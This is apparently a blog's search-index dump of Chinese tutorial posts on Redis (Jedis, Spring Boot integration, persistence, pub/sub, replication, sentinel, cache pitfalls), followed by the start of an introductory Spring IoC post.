TestPing.java public class TestPing { public static void main(String[] args) { Jedis jedis = new Jedis(\"192.168.xx.xxx\", 6379); String response = jedis.ping(); System.out.println(response); // PONG } } 断开连接 事务 public class TestTX { public static void main(String[] args) { Jedis jedis = new Jedis(\"39.99.xxx.xx\", 6379); JSONObject jsonObject = new JSONObject(); jsonObject.put(\"hello\", \"world\"); jsonObject.put(\"name\", \"kuangshen\"); // 开启事务 Transaction multi = jedis.multi(); String result = jsonObject.toJSONString(); // jedis.watch(result) try { multi.set(\"user1\", result); multi.set(\"user2\", result); // 执行事务 multi.exec(); }catch (Exception e){ // 放弃事务 multi.discard(); } finally { // 关闭连接 System.out.println(jedis.get(\"user1\")); System.out.println(jedis.get(\"user2\")); jedis.close(); } } } ","date":"2021-04-06","objectID":"/posts/redis/:6:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"七、SpringBoot整合 导入依赖 \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-data-redis\u003c/artifactId\u003e \u003c/dependency\u003e springboot 2.x后 ，原来使用的 Jedis 被 lettuce 替换。 jedis：采用的直连，多个线程操作的话，是不安全的。如果要避免不安全，使用jedis pool连接池！更像BIO模式 lettuce：采用netty，实例可以在多个线程中共享，不存在线程不安全的情况！可以减少线程数据了，更像NIO模式 我们在学习SpringBoot自动配置的原理时，整合一个组件并进行配置一定会有一个自动配置类xxxAutoConfiguration,并且在spring.factories中也一定能找到这个类的完全限定名。Redis也不例外。 那么就一定还存在一个RedisProperties类 之前我们说SpringBoot2.x后默认使用Lettuce来替换Jedis，现在我们就能来验证了。 先看Jedis: @ConditionalOnClass注解中有两个类是默认不存在的，所以Jedis是无法生效的 然后再看Lettuce： 完美生效。 现在我们回到RedisAutoConfiguratio 只有两个简单的Bean RedisTemplate StringRedisTemplate 当看到xxTemplate时可以对比RestTemplat、SqlSessionTemplate,通过使用这些Template来间接操作组件。那么这俩也不会例外。分别用于操作Redis和Redis中的String数据类型。 在RedisTemplate上也有一个条件注解，说明我们是可以对其进行定制化的 说完这些，我们需要知道如何编写配置文件然后连接Redis，就需要阅读RedisProperties 这是一些基本的配置属性。 还有一些连接池相关的配置。注意使用时一定使用Lettuce的连接池。 编写配置文件 # 配置redis spring.redis.host=39.99.xxx.xx spring.redis.port=6379 使用RedisTemplate @SpringBootTest class Redis02SpringbootApplicationTests { @Autowired private RedisTemplate redisTemplate; @Test void contextLoads() { // redisTemplate 操作不同的数据类型，api和我们的指令是一样的 // opsForValue 操作字符串 类似String // opsForList 操作List 类似List // opsForHah // 除了基本的操作，我们常用的方法都可以直接通过redisTemplate操作，比如事务和基本的CRUD // 获取连接对象 //RedisConnection connection = redisTemplate.getConnectionFactory().getConnection(); //connection.flushDb(); //connection.flushAll(); redisTemplate.opsForValue().set(\"mykey\",\"kuangshen\"); System.out.println(redisTemplate.opsForValue().get(\"mykey\")); } } 测试结果 此时我们回到Redis查看数据时候，惊奇发现全是乱码，可是程序中可以正常输出： 这时候就关系到存储对象的序列化问题，在网络中传输的对象也是一样需要序列化，否者就全是乱码。 我们转到看那个默认的RedisTemplate内部什么样子： 在最开始就能看到几个关于序列化的参数。 默认的序列化器是采用JDK序列化器 而默认的RedisTemplate中的所有序列化器都是使用这个序列化器： 后续我们定制RedisTemplate就可以对其进行修改。 RedisSerializer提供了多种序列化方案： 直接调用RedisSerializer的静态方法来返回序列化器，然后set 自己new 相应的实现类，然后set 定制RedisTemplate的模板： 我们创建一个Bean加入容器，就会触发RedisTemplate上的条件注解使默认的RedisTemplate失效。 @Configuration public class RedisConfig { @Bean public Red","date":"2021-04-06","objectID":"/posts/redis/:7:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"八、自定义Redis工具类 使用RedisTemplate需要频繁调用.opForxxx然后才能进行对应的操作，这样使用起来代码效率低下，工作中一般不会这样使用，而是将这些常用的公共API抽取出来封装成为一个工具类，然后直接使用工具类来间接操作Redis,不但效率高并且易用。 工具类参考博客： https://www.cnblogs.com/zeng1994/p/03303c805731afc9aa9c60dbbd32a323.html https://www.cnblogs.com/zhzhlong/p/11434284.html ","date":"2021-04-06","objectID":"/posts/redis/:8:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"九、Redis.conf 容量单位不区分大小写，G和GB有区别 可以使用 include 组合多个配置问题 网络配置 日志输出级别 日志输出文件 持久化规则 由于Redis是基于内存的数据库，需要将数据由内存持久化到文件中 持久化方式： RDB AOF RDB文件相关 主从复制 Security模块中进行密码设置 客户端连接相关 maxclients 10000 最大客户端数量 maxmemory \u003cbytes\u003e 最大内存限制 maxmemory-policy noeviction # 内存达到限制值的处理策略 redis 中的默认的过期策略是 volatile-lru 。 设置方式 config set maxmemory-policy volatile-lru 1 maxmemory-policy 六种方式 **1、volatile-lru：**只对设置了过期时间的key进行LRU（默认值） 2、allkeys-lru ： 删除lru算法的key **3、volatile-random：**随机删除即将过期key **4、allkeys-random：**随机删除 5、volatile-ttl ： 删除即将过期的 6、noeviction ： 永不过期，返回错误 AOF相关部分 ","date":"2021-04-06","objectID":"/posts/redis/:9:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"十、持久化—RDB RDB：Redis Databases [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-C0mm1D4A-1597890996524)(狂神说 Redis.assets/image-20200818122236614.png)] ","date":"2021-04-06","objectID":"/posts/redis/:10:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"什么是RDB 在指定时间间隔后，将内存中的数据集快照写入数据库 ；在恢复时候，直接读取快照文件，进行数据的恢复 ； 默认情况下， Redis 将数据库快照保存在名字为 dump.rdb的二进制文件中。文件名可以在配置文件中进行自定义。 ","date":"2021-04-06","objectID":"/posts/redis/:10:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"工作原理 在进行 RDB 的时候，redis 的主线程是不会做 io 操作的，主线程会 fork 一个子线程来完成该操作； Redis 调用forks。同时拥有父进程和子进程。 子进程将数据集写入到一个临时 RDB 文件中。 当子进程完成对新 RDB 文件的写入时，Redis 用新 RDB 文件替换原来的 RDB 文件，并删除旧的 RDB 文件。 这种工作方式使得 Redis 可以从写时复制（copy-on-write）机制中获益(因为是使用子进程进行写操作，而父进程依然可以接收来自客户端的请求。) ","date":"2021-04-06","objectID":"/posts/redis/:10:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"触发机制 save的规则满足的情况下，会自动触发rdb原则 执行flushall命令，也会触发我们的rdb原则 退出redis，也会自动产生rdb文件 save 使用 save 命令，会立刻对当前内存中的数据进行持久化 ,但是会阻塞，也就是不接受其他操作了； 由于 save 命令是同步命令，会占用Redis的主进程。若Redis数据非常多时，save命令执行速度会非常慢，阻塞所有客户端的请求。 flushall命令 flushall 命令也会触发持久化 ； 触发持久化规则 满足配置条件中的触发条件 ； 可以通过配置文件对 Redis 进行设置， 让它在“ N 秒内数据集至少有 M 个改动”这一条件被满足时， 自动进行数据集保存操作。 bgsave bgsave 是异步进行，进行持久化的时候，redis 还可以将继续响应客户端请求 ； bgsave和save对比 命令 save bgsave IO类型 同步 异步 阻塞？ 是 是（阻塞发生在fock()，通常非常快） 复杂度 O(n) O(n) 优点 不会消耗额外的内存 不阻塞客户端命令 缺点 阻塞客户端命令 需要fock子进程，消耗内存 ","date":"2021-04-06","objectID":"/posts/redis/:10:3","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"优缺点 优点： 适合大规模的数据恢复 对数据的完整性要求不高 缺点： 需要一定的时间间隔进行操作，如果redis意外宕机了，这个最后一次修改的数据就没有了。 fork进程的时候，会占用一定的内容空间。 ","date":"2021-04-06","objectID":"/posts/redis/:10:4","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"十一、持久化AOF Append Only File 将我们所有的命令都记录下来，history，恢复的时候就把这个文件全部再执行一遍 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Z8wr9lBW-1597890996525)(狂神说 Redis.assets/image-20200818123711375.png)] 以日志的形式来记录每个写的操作，将Redis执行过的所有指令记录下来（读操作不记录），只许追加文件但不可以改写文件，redis启动之初会读取该文件重新构建数据，换言之，redis重启的话就根据日志文件的内容将写指令从前到后执行一次以完成数据的恢复工作。 ","date":"2021-04-06","objectID":"/posts/redis/:11:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"什么是AOF 快照功能（RDB）并不是非常耐久（durable）： 如果 Redis 因为某些原因而造成故障停机， 那么服务器将丢失最近写入、以及未保存到快照中的那些数据。 从 1.1 版本开始， Redis 增加了一种完全耐久的持久化方式： AOF 持久化。 如果要使用AOF，需要修改配置文件： appendonly no yes则表示启用AOF 默认是不开启的，我们需要手动配置，然后重启redis，就可以生效了！ 如果这个aof文件有错位，这时候redis是启动不起来的，我需要修改这个aof文件 redis给我们提供了一个工具redis-check-aof --fix 优点和缺点 appendonly yes # 默认是不开启aof模式的，默认是使用rdb方式持久化的，在大部分的情况下，rdb完全够用 appendfilename \"appendonly.aof\" # appendfsync always # 每次修改都会sync 消耗性能 appendfsync everysec # 每秒执行一次 sync 可能会丢失这一秒的数据 # appendfsync no # 不执行 sync ,这时候操作系统自己同步数据，速度最快 优点 每一次修改都会同步，文件的完整性会更加好 没秒同步一次，可能会丢失一秒的数据 从不同步，效率最高 缺点 相对于数据文件来说，aof远远大于rdb，修复速度比rdb慢！ Aof运行效率也要比rdb慢，所以我们redis默认的配置就是rdb持久化 ","date":"2021-04-06","objectID":"/posts/redis/:11:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"十二、RDB和AOP选择 ","date":"2021-04-06","objectID":"/posts/redis/:12:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"RDB 和 AOF 对比 RDB AOF 启动优先级 低 高 体积 小 大 恢复速度 快 慢 数据安全性 丢数据 根据策略决定 ","date":"2021-04-06","objectID":"/posts/redis/:12:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"如何选择使用哪种持久化方式？ 一般来说， 如果想达到足以媲美 PostgreSQL 的数据安全性， 你应该同时使用两种持久化功能。 如果你非常关心你的数据， 但仍然可以承受数分钟以内的数据丢失， 那么你可以只使用 RDB 持久化。 有很多用户都只使用 AOF 持久化， 但并不推荐这种方式： 因为定时生成 RDB 快照（snapshot）非常便于进行数据库备份， 并且 RDB 恢复数据集的速度也要比 AOF 恢复的速度要快。 ","date":"2021-04-06","objectID":"/posts/redis/:12:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"十三、Redis发布与订阅 Redis 发布订阅(pub/sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-IBT2pjCa-1597890996526)(狂神说 Redis.assets/image-20200818162849693.png)] 下图展示了频道 channel1 ， 以及订阅这个频道的三个客户端 —— client2 、 client5 和 client1 之间的关系： 当有新消息通过 PUBLISH 命令发送给频道 channel1 时， 这个消息就会被发送给订阅它的三个客户端： ","date":"2021-04-06","objectID":"/posts/redis/:13:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"命令 命令 描述 PSUBSCRIBE pattern [pattern..] 订阅一个或多个符合给定模式的频道。 PUNSUBSCRIBE pattern [pattern..] 退订一个或多个符合给定模式的频道。 PUBSUB subcommand [argument[argument]] 查看订阅与发布系统状态。 PUBLISH channel message 向指定频道发布消息 SUBSCRIBE channel [channel..] 订阅给定的一个或多个频道。 SUBSCRIBE channel [channel..] 退订一个或多个频道 ","date":"2021-04-06","objectID":"/posts/redis/:13:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"示例 ------------订阅端---------------------- 127.0.0.1:6379\u003e SUBSCRIBE sakura # 订阅sakura频道 Reading messages... (press Ctrl-C to quit) # 等待接收消息 1) \"subscribe\" # 订阅成功的消息 2) \"sakura\" 3) (integer) 1 1) \"message\" # 接收到来自sakura频道的消息 \"hello world\" 2) \"sakura\" 3) \"hello world\" 1) \"message\" # 接收到来自sakura频道的消息 \"hello i am sakura\" 2) \"sakura\" 3) \"hello i am sakura\" --------------消息发布端------------------- 127.0.0.1:6379\u003e PUBLISH sakura \"hello world\" # 发布消息到sakura频道 (integer) 1 127.0.0.1:6379\u003e PUBLISH sakura \"hello i am sakura\" # 发布消息 (integer) 1 -----------------查看活跃的频道------------ 127.0.0.1:6379\u003e PUBSUB channels 1) \"sakura\" ","date":"2021-04-06","objectID":"/posts/redis/:13:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"原理 每个 Redis 服务器进程都维持着一个表示服务器状态的 redis.h/redisServer 结构， 结构的 pubsub_channels 属性是一个字典， 这个字典就用于保存订阅频道的信息，其中，字典的键为正在被订阅的频道， 而字典的值则是一个链表， 链表中保存了所有订阅这个频道的客户端。 客户端订阅，就被链接到对应频道的链表的尾部，退订则就是将客户端节点从链表中移除。 ","date":"2021-04-06","objectID":"/posts/redis/:13:3","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"缺点 如果一个客户端订阅了频道，但自己读取消息的速度却不够快的话，那么不断积压的消息会使redis输出缓冲区的体积变得越来越大，这可能使得redis本身的速度变慢，甚至直接崩溃。 这和数据传输可靠性有关，如果在订阅方断线，那么他将会丢失所有在短线期间发布者发布的消息。 ","date":"2021-04-06","objectID":"/posts/redis/:13:4","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"应用 消息订阅：公众号订阅，微博关注等等（起始更多是使用消息队列来进行实现） 多人在线聊天室。 稍微复杂的场景，我们就会使用消息中间件MQ处理。 ","date":"2021-04-06","objectID":"/posts/redis/:13:5","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"十四、Redis主从复制 ","date":"2021-04-06","objectID":"/posts/redis/:14:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"概念 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点（Master/Leader）,后者称为从节点（Slave/Follower）， 数据的复制是单向的！只能由主节点复制到从节点（主节点以写为主、从节点以读为主）。 默认情况下，每台Redis服务器都是主节点，一个主节点可以有0个或者多个从节点，但每个从节点只能由一个主节点。 ","date":"2021-04-06","objectID":"/posts/redis/:14:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"作用 数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余的方式。 故障恢复：当主节点故障时，从节点可以暂时替代主节点提供服务，是一种服务冗余的方式 负载均衡：在主从复制的基础上，配合读写分离，由主节点进行写操作，从节点进行读操作，分担服务器的负载；尤其是在多读少写的场景下，通过多个从节点分担负载，提高并发量。 高可用基石：主从复制还是哨兵和集群能够实施的基础。 ","date":"2021-04-06","objectID":"/posts/redis/:14:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"为什么使用集群 单台服务器难以负载大量的请求 单台服务器故障率高，系统崩坏概率大 单台服务器内存容量有限。 ","date":"2021-04-06","objectID":"/posts/redis/:14:3","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"环境配置 我们在讲解配置文件的时候，注意到有一个replication模块 (见Redis.conf中第8条) 查看当前库的信息：info replication 127.0.0.1:6379\u003e info replication # Replication role:master # 角色 connected_slaves:0 # 从机数量 master_replid:3b54deef5b7b7b7f7dd8acefa23be48879b4fcff master_replid2:0000000000000000000000000000000000000000 master_repl_offset:0 second_repl_offset:-1 repl_backlog_active:0 repl_backlog_size:1048576 repl_backlog_first_byte_offset:0 repl_backlog_histlen:0 既然需要启动多个服务，就需要多个配置文件。每个配置文件对应修改以下信息： 端口号 pid文件名 日志文件名 rdb文件名 启动单机多服务集群： ","date":"2021-04-06","objectID":"/posts/redis/:14:4","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"一主二从配置 ==默认情况下，每台Redis服务器都是主节点；==我们一般情况下只用配置从机就好了！ 认老大！一主（79）二从（80，81） 使用SLAVEOF host port就可以为从机配置主机了。 然后主机上也能看到从机的状态： 我们这里是使用命令搭建，是暂时的，==真实开发中应该在从机的配置文件中进行配置，==这样的话是永久的。 ","date":"2021-04-06","objectID":"/posts/redis/:14:5","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"使用规则 从机只能读，不能写，主机可读可写但是多用于写。 127.0.0.1:6381\u003e set name sakura # 从机6381写入失败 (error) READONLY You can't write against a read only replica. 127.0.0.1:6380\u003e set name sakura # 从机6380写入失败 (error) READONLY You can't write against a read only replica. 127.0.0.1:6379\u003e set name sakura OK 127.0.0.1:6379\u003e get name \"sakura\" 当主机断电宕机后，默认情况下从机的角色不会发生变化 ，集群中只是失去了写操作，当主机恢复以后，又会连接上从机恢复原状。 当从机断电宕机后，若不是使用配置文件配置的从机，再次启动后作为主机是无法获取之前主机的数据的，若此时重新配置称为从机，又可以获取到主机的所有数据。这里就要提到一个同步原理。 第二条中提到，默认情况下，主机故障后，不会出现新的主机，有两种方式可以产生新的主机： 从机手动执行命令slaveof no one,这样执行以后从机会独立出来成为一个主机 使用哨兵模式（自动选举） 如果没有老大了，这个时候能不能选择出来一个老大呢？手动！ 如果主机断开了连接，我们可以使用SLAVEOF no one让自己变成主机！其他的节点就可以手动连接到最新的主节点（手动）！如果这个时候老大修复了，那么久重新连接！ ","date":"2021-04-06","objectID":"/posts/redis/:14:6","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"十五、哨兵模式 更多信息参考博客：https://www.jianshu.com/p/06ab9daf921d 主从切换技术的方法是：当主服务器宕机后，需要手动把一台从服务器切换为主服务器，这就需要人工干预，费事费力，还会造成一段时间内服务不可用。这不是一种推荐的方式，更多时候，我们优先考虑哨兵模式。 单机单个哨兵 哨兵的作用： 通过发送命令，让Redis服务器返回监控其运行状态，包括主服务器和从服务器。 当哨兵监测到master宕机，会自动将slave切换成master，然后通过发布订阅模式通知其他的从服务器，修改配置文件，让它们切换主机。 多哨兵模式 哨兵的核心配置 sentinel monitor mymaster 127.0.0.1 6379 1 数字1表示 ：当一个哨兵主观认为主机断开，就可以客观认为主机故障，然后开始选举新的主机。 测试 redis-sentinel xxx/sentinel.conf 成功启动哨兵模式 此时哨兵监视着我们的主机6379，当我们断开主机后： 哨兵模式优缺点 优点： 哨兵集群，基于主从复制模式，所有主从复制的优点，它都有 主从可以切换，故障可以转移，系统的可用性更好 哨兵模式是主从模式的升级，手动到自动，更加健壮 缺点： Redis不好在线扩容，集群容量一旦达到上限，在线扩容就十分麻烦 实现哨兵模式的配置其实是很麻烦的，里面有很多配置项 哨兵模式的全部配置 完整的哨兵模式配置文件 sentinel.conf # Example sentinel.conf # 哨兵sentinel实例运行的端口 默认26379 port 26379 # 哨兵sentinel的工作目录 dir /tmp # 哨兵sentinel监控的redis主节点的 ip port # master-name 可以自己命名的主节点名字 只能由字母A-z、数字0-9 、这三个字符\".-_\"组成。 # quorum 当这些quorum个数sentinel哨兵认为master主节点失联 那么这时 客观上认为主节点失联了 # sentinel monitor \u003cmaster-name\u003e \u003cip\u003e \u003credis-port\u003e \u003cquorum\u003e sentinel monitor mymaster 127.0.0.1 6379 1 # 当在Redis实例中开启了requirepass foobared 授权密码 这样所有连接Redis实例的客户端都要提供密码 # 设置哨兵sentinel 连接主从的密码 注意必须为主从设置一样的验证密码 # sentinel auth-pass \u003cmaster-name\u003e \u003cpassword\u003e sentinel auth-pass mymaster MySUPER--secret-0123passw0rd # 指定多少毫秒之后 主节点没有应答哨兵sentinel 此时 哨兵主观上认为主节点下线 默认30秒 # sentinel down-after-milliseconds \u003cmaster-name\u003e \u003cmilliseconds\u003e sentinel down-after-milliseconds mymaster 30000 # 这个配置项指定了在发生failover主备切换时最多可以有多少个slave同时对新的master进行 同步， 这个数字越小，完成failover所需的时间就越长， 但是如果这个数字越大，就意味着越 多的slave因为replication而不可用。 可以通过将这个值设为 1 来保证每次只有一个slave 处于不能处理命令请求的状态。 # sentinel parallel-syncs \u003cmaster-name\u003e \u003cnumslaves\u003e sentinel parallel-syncs mymaster 1 # 故障转移的超时时间 failover-timeout 可以用在以下这些方面： #1. 同一个sentinel对同一个master两次failover之间的间隔时间。 #2. 当一个slave从一个错误的master那里同步数据开始计算时间。直到slave被纠正为向正确的master那里同步数据时。 #3.当想要取消一个正在进行的failover所需要的时间。 #4.当进行failover时，配置所有slaves指向新的master所需的最大时间。不过，即使过了这个超时，slaves依然会被正确配置为指向master，但是就不按parallel-syncs所配置的规则来了 # 默认三分钟 # sentinel failover-timeout \u003cmaster-name\u003e \u003cmilliseconds\u003e sentinel failover-timeout mymaster 18","date":"2021-04-06","objectID":"/posts/redis/:15:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"十六、缓存穿透与雪崩 ","date":"2021-04-06","objectID":"/posts/redis/:16:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"缓存穿透（查不到） 概念 在默认情况下，用户请求数据时，会先在缓存(Redis)中查找，若没找到即缓存未命中，再在数据库中进行查找，数量少可能问题不大，可是一旦大量的请求数据（例如秒杀场景）缓存都没有命中的话，就会全部转移到数据库上，造成数据库极大的压力，就有可能导致数据库崩溃。网络安全中也有人恶意使用这种手段进行攻击被称为洪水攻击。 解决方案 布隆过滤器 对所有可能查询的参数以Hash的形式存储，以便快速确定是否存在这个值，在控制层先进行拦截校验，校验不通过直接打回，减轻了存储系统的压力。 缓存空对象 一次请求若在缓存和数据库中都没找到，就在缓存中方一个空对象用于处理后续这个请求。 这样做有一个缺陷：存储空对象也需要空间，大量的空对象会耗费一定的空间，存储效率并不高。解决这个缺陷的方式就是设置较短过期时间 即使对空值设置了过期时间，还是会存在缓存层和存储层的数据会有一段时间窗口的不一致，这对于需要保持一致性的业务会有影响。 ","date":"2021-04-06","objectID":"/posts/redis/:16:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"缓存击穿（量太大，缓存过期） 概念 相较于缓存穿透，缓存击穿的目的性更强，一个存在的key，在缓存过期的一刻，同时有大量的请求，这些请求都会击穿到DB，造成瞬时DB请求量大、压力骤增。这就是缓存被击穿，只是针对其中某个key的缓存不可用而导致击穿，但是其他的key依然可以使用缓存响应。 比如热搜排行上，一个热点新闻被同时大量访问就可能导致缓存击穿。 解决方案 设置热点数据永不过期 这样就不会出现热点数据过期的情况，但是当Redis内存空间满的时候也会清理部分数据，而且此种方案会占用空间，一旦热点数据多了起来，就会占用部分空间。 加互斥锁(分布式锁) 在访问key之前，采用SETNX（set if not exists）来设置另一个短期key来锁住当前key的访问，访问结束再删除该短期key。保证同时刻只有一个线程访问。这样对锁的要求就十分高。 ","date":"2021-04-06","objectID":"/posts/redis/:16:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"缓存雪崩 概念 大量的key设置了相同的过期时间，导致在缓存在同一时刻全部失效，造成瞬时DB请求量大、压力骤增，引起雪崩。 解决方案 redis高可用 这个思想的含义是，既然redis有可能挂掉，那我多增设几台redis，这样一台挂掉之后其他的还可以继续工作，其实就是搭建的集群 限流降级 这个解决方案的思想是，在缓存失效后，通过加锁或者队列来控制读数据库写缓存的线程数量。比如对某个key只允许一个线程查询数据和写缓存，其他线程等待。 数据预热 数据加热的含义就是在正式部署之前，我先把可能的数据先预先访问一遍，这样部分可能大量访问的数据就会加载到缓存中。在即将发生大并发访问前手动触发加载缓存不同的key，设置不同的过期时间，让缓存失效的时间点尽量均匀。 ","date":"2021-04-06","objectID":"/posts/redis/:16:3","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["Java后端"],"content":" Spring5 ","date":"2021-04-06","objectID":"/posts/spring/:0:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"1.、Spring ","date":"2021-04-06","objectID":"/posts/spring/:1:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"1.1、简介 Spring ——\u003e 春天，为开源软件带来了春天 2002，首次推出了Spring框架的雏形：interface21框架！ Spring框架以interface21框架为基础，经过重新设计，并不断丰富其内涵，于2004年3月24日发布了1.0正式版 Spring的理念：使用现有的技术更加容易使用，本身是一个大杂烩，整合了现有的技术框架！ SSH：Struct2 + Spring + Hibernate（全自动持久化框架）！ SSM：SpringMVC + Spring + MyBatis（半自动持久化框架，可自定义性质更强）！ spring官网： https://spring.io/projects/spring-framework#overview 官方下载： https://repo.spring.io/release/org/springframework/spring/ GitHub： https://github.com/spring-projects/spring-framework Spring Web MVC： spring-webmvc最新版 Spring Web MVC和Spring-JDBC的pom配置文件： \u003c!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-webmvc\u003c/artifactId\u003e \u003cversion\u003e5.2.7.RELEASE\u003c/version\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/org.springframework/spring-jdbc --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-jdbc\u003c/artifactId\u003e \u003cversion\u003e5.2.7.RELEASE\u003c/version\u003e \u003c/dependency\u003e ","date":"2021-04-06","objectID":"/posts/spring/:1:1","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"1.2 优点 Spring是一个开源的免费的框架（容器）！ Spring是一个轻量级的、非入侵式的框架！ 控制反转（IoC），面向切面编程（AOP） 支持事务的处理，对框架整合的支持！（几乎市面上所有热门框架都能整合进去）！ === 总结一句话：Spring就是一个轻量级的控制反转（IoC）和面向切面编程（AOP）的框架！ === ","date":"2021-04-06","objectID":"/posts/spring/:1:2","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"1.3 组成 ","date":"2021-04-06","objectID":"/posts/spring/:1:3","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"1.4、扩展 现代化的java开发 -\u003e 基于Spring的开发！ Spring Boot 一个快速开发的脚手架 基于SpringBoot可以快速开发单个微服务 约定大于配置！ Spring Cloud SpringCloud是基于SpringBoot实现的！ 因为现在大多数公司都在使用SpringBoot进行快速开发，学习SpringBoot的前提，需要完全掌握Spring及SpringMVC！承上启下的作用！ ","date":"2021-04-06","objectID":"/posts/spring/:1:4","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"2、IoC（控制反转）理论推导 传统的调用 UserDao package dao; public interface UserDao { void getUser(); } UserDaoImp package dao; public class UserDaoImpl implements UserDao{ public void getUser() { System.out.println(\"默认获取用户数据\"); } } UserSevice package Service; public interface UserService { void getUser(); } UserServiceImp package Service; import dao.UserDao; import dao.UserDaoImpl; public class UserServiceImpl implements UserService{ UserDao userDao = new UserDaoImpl(); public void getUser(){ userDao.getUser(); } } 测试 package holle0; import Service.UserService; import Service.UserServiceImpl; public class MyTest0 { public static void main(String[] args) { // 用户实际调用的是业务层，dao层他们不需要接触 UserService userService = new UserServiceImpl(); userService.getUser(); } } 在我们之前的业务中，用户的需求可能会影响我们原来的代码，我们需要根据用户的需求去修改原代码！如果程序代码量十分大，修改一次的成本代价十分昂贵！ **改良：**我们使用一个Set接口实现。已经发生了革命性的变化！ //在Service层的实现类(UserServiceImpl)增加一个Set()方法 //利用set动态实现值的注入！ //DAO层并不写死固定调用哪一个UserDao的实现类 //而是通过Service层调用方法设置实现类！ private UserDao userDao; public void setUserDao(UserDao userDao){ this.userDao = userDao; } set() 方法实际上是动态改变了 UserDao userDao 的 初始化部分（new UserDaoImpl()） 测试中加上 ((UserServiceImpl)userService).setUserDao(new UserDaoImpl()); 之前，程序是主动创建对象！控制权在程序猿手上！ 使用了set注入后，程序不再具有主动性，而是变成了被动的接受对象！（主动权在客户手上） 本质上解决了问题，程序员不用再去管理对象的创建 系统的耦合性大大降低，可以更专注在业务的实现上 这是IoC（控制反转）的原型，反转(理解)：主动权交给了用户 ","date":"2021-04-06","objectID":"/posts/spring/:2:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"IoC本质 ","date":"2021-04-06","objectID":"/posts/spring/:2:1","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"3、HolleSpring 在父模块中导入jar包 \u003c!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-webmvc\u003c/artifactId\u003e \u003cversion\u003e5.2.7.RELEASE\u003c/version\u003e \u003c/dependency\u003e pojo的Hello.java package pojo; public class Hello { private String str; public String getStr() { return str; } public void setStr(String str) { this.str = str; } @Override public String toString() { return \"Holle [str=\" + str + \"]\"; } } 在resource里面的xml配置 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" 